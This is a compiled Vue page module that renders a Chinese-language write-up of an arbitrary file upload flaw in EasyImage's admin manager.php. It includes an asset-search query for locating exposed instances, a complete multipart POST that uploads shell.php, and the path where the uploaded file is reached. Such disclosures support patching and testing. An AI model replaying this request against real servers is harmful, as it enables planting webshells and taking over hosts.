import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as n,c as i,e as a}from"./app-58e4a7d6.js";const d={},s=a(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>EasyImage manager.php 存在任意文件上传漏洞，攻击者通过漏洞可以上传恶意文件到服务器获取服务器权限</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>EasyImage
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;EasyImage-简单图床&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>主页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230417094210473.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>登陆后台后发送POC (通过任意文件读取获取账号密码)</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /admin/manager.php?p= HTTP/1.1
Host: 
Accept: application/json
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Cache-Control: no-cache
Content-Length: 1622
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryEUCF9Yq83AkaO6sv
Cookie: Hm_lvt_c790ac2bdc2f385757ecd0183206108d=1680341989; auth=a%3A2%3A%7Bi%3A0%3Bs%3A7%3A%22tossone%22%3Bi%3A1%3Bs%3A32%3A%22590368bca375c2f8fe93df7d253481e8%22%3B%7D; Hm_lpvt_c790ac2bdc2f385757ecd0183206108d=1680342144; filemanager=sdeemhj3b9aeoretftrlijjh25
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36

------WebKitFormBoundaryEUCF9Yq83AkaO6sv
Content-Disposition: form-data; name=&quot;dzuuid&quot;

7e4fad9a-3545-4ed6-b655-b3e3a6b2978c
------WebKitFormBoundaryEUCF9Yq83AkaO6sv
Content-Disposition: form-data; name=&quot;dzchunkindex&quot;

0
------WebKitFormBoundaryEUCF9Yq83AkaO6sv
Content-Disposition: form-data; name=&quot;dztotalfilesize&quot;

583
------WebKitFormBoundaryEUCF9Yq83AkaO6sv
Content-Disposition: form-data; name=&quot;dzchunksize&quot;

10000000
------WebKitFormBoundaryEUCF9Yq83AkaO6sv
Content-Disposition: form-data; name=&quot;dztotalchunkcount&quot;

1
------WebKitFormBoundaryEUCF9Yq83AkaO6sv
Content-Disposition: form-data; name=&quot;dzchunkbyteoffset&quot;

0
------WebKitFormBoundaryEUCF9Yq83AkaO6sv
Content-Disposition: form-data; name=&quot;p&quot;


------WebKitFormBoundaryEUCF9Yq83AkaO6sv
Content-Disposition: form-data; name=&quot;fullpath&quot;

shell.php
------WebKitFormBoundaryEUCF9Yq83AkaO6sv
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.php&quot;
Content-Type: application/octet-stream

234

------WebKitFormBoundaryEUCF9Yq83AkaO6sv--
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230417094255974.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>上传访问地址为</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/i/shell.php
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,14),t=[s];function l(r,o){return n(),i("div",null,t)}const u=e(d,[["render",l],["__file","EasyImage manager.php 后台任意文件上传漏洞.html.vue"]]);export{u as default};
